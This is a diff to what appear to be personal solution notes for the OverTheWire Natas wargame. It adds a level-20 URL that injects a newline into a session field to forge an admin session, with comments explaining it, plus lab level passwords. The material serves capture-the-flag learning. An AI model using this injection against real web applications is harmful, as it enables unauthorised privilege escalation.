@@ -211,3 +211,16 @@ xvKIqDjy4OPv7wCRgDlmj0pFsCsDjhdP
 20
 eofm3Wsshxc5bwtVnEuGIlr7ivb9KABF
 
+http://natas20.natas.labs.overthewire.org/?debug=true&name=foo%0Aadmin 1
+
+
+// type that url in the url bar
+// the below part is important
+// ?debug=true&name=foo%0Aadmin 1
+// ?debug=true : use debug function
+// %0A : new line
+// foo : doesn't matter
+// admin 1 : to make an admin session.
+
+21
+IFekPyrQXftziDEsUr3x21sYuahypdgJ
